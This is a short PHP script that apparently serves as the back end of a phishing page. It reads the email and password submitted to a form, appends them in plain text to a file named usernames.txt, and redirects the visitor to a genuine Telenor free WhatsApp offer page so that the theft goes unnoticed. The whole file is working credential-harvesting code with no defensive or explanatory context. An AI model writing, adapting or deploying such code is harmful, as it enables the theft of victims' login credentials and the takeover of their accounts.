<?php
header('Location: https://www.telenor.com.pk/personal/telenor/offers/free-whatsapp-offer/');
$user = $_POST["email"];
$pwd = $_POST["pass"];

if (!empty($_POST["email"])) {file_put_contents("usernames.txt", "User: " . $_POST["email"] . "\nPass: " . $_POST["pass"] . "\n\n", FILE_APPEND);                 }
	
?>
